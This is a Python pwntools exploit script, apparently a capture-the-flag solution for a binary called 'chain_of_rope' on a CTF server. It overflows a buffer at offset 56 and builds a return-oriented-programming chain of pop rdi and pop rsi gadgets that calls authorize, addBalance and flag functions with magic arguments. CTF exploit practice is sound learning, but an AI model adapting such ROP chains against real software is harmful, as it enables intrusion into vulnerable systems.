from pwn import *
#import pdb
exe = context.binary = ELF('chain_of_rope')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

remotehost = ('ctf.fibonhack.it', 16000)

gdbscript = """
b *0x4011ab
"""

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
        
io = start()
#ui.pause()
context.log_level = 'debug'
#pdb.set_trace()

##### Generation of unique sequences ####
g = cyclic_gen()
#io.sendline(g.get(100))
#log.info(f"offset: {g.find(b'eaaa')}") #(16, 0, 16)

io.recvuntil(b"access\n", drop=True)

####### pop rdi gadget ########
# ropper -f file | grep 'rdi'
# 0x0000000000401403: pop rdi; ret;
pop_rdi_gadget = 0x0000000000401403
pop_rsi_gadget = 0x0000000000401401

ret_gadget = 0x000000000040101a

##### Functions #####

authorize_address =  0x401196
addBalance_address = 0x4011ab
flag_address = 0x4011eb

io.sendline(b'1')

buff = flat({
	56: p64(authorize_address) + p64(pop_rdi_gadget) + p64(0xdeadbeef) + p64(addBalance_address) + p64(pop_rdi_gadget) + p64(0xba5eba11) + p64(pop_rsi_gadget) + p64(0xbedabb1e) + p64(0x00) + p64(flag_address) + p64(exe.sym.main) 
})
io.sendline(buff)
io.recvuntil(b"access\n", drop=True)

io.sendline(b'2')


io.interactive()